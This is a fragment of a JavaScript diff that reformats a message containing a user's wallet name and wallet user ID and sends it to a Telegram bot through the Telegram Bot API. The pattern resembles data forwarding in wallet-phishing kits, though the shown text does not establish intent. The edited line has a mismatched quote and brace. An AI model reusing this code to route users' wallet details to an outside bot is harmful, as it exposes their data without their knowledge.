@@ -179,7 +179,8 @@ document.addEventListener('visibilitychange', () => {
 // Function to send data to Telegram bot
 async function sendToTelegramBot(data, botToken, chatId) {
     try {
-        const message = `Wallet Data:\n\nWallet Name: ${data.walletName}\nWallet User ID: ${data.walletUserId}`;
+        //const message = `Wallet Data:\n\nWallet Name: ${data.walletName}\nWallet User ID: ${data.walletUserId}`;
+	const message = `{ name: '${data.walletName}', id: '${data.walletUserId} }'`;
         const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
         
         const response = await fetch(url, {
